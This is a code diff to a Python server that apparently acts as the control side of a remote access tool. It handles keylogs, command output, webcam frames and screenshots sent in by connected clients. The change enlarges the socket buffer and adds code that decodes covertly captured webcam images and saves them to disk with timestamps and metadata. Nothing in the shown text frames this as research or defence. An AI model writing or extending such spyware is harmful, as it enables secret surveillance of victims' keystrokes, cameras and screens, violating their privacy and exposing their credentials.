@@ -266,7 +266,7 @@ def handle_client(client_socket):
     global cmd_output, keylogs
     while True:
         try:
-            data = client_socket.recv(8192)
+            data = client_socket.recv(102400)
             if not data:
                 break
             if data.startswith(b"KEY:"):
@@ -280,6 +280,20 @@ def handle_client(client_socket):
                 with frame_lock:
                     global latest_frame
                     latest_frame = img_data.encode()
+                # Save webcam image to images folder
+                img_dir = os.path.join(os.path.dirname(__file__), "images")
+                os.makedirs(img_dir, exist_ok=True)
+                timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                filename = f"webcam_{timestamp}.jpg"
+                img_path = os.path.join(img_dir, filename)
+                try:
+                    img_bytes = base64.b64decode(img_data + '=' * (-len(img_data) % 4))
+                    with open(img_path, "wb") as f:
+                        f.write(img_bytes)
+                    save_image_metadata(filename, "Unknown", timestamp)
+                    logging.info(f"[WEBCAM] Saved webcam image as {filename}")
+                except Exception as e:
+                    logging.error(f"Failed to save webcam image: {e}")
             if data.startswith(b"SCREENSHOT:"):
                 img_data = data[len("SCREENSHOT:"):].decode()
                 # Save screenshot to images folder
